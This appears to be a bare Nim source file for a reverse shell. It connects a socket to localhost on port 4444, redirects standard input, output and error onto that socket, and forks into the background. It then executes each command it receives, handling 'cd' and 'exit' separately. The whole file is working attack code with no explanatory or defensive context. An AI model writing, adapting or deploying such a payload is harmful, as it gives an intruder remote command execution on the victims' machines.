import osproc, os, strutils, net, posix

let socket = newSocket()
socket.connect("localhost", Port(4444), 5000)
discard dup2(cast[cint](socket.getFd), stdin.getFileHandle)
discard dup2(cast[cint](socket.getFd), stdout.getFileHandle)
discard dup2(cast[cint](socket.getFd), stderr.getFileHandle)
if fork() == 0:
   while true:
         socket.send(getCurrentDir() & "$ ")
         var input = stdin.readLine()
         var split = rsplit(input, ' ', maxsplit=1)
         if split[0] == "cd":
            setCurrentDir(split[1])
         elif split[0] == "exit":
            socket.close()
            quit(0)
         else:
            discard execCmd(input)
else:
   quit(0)
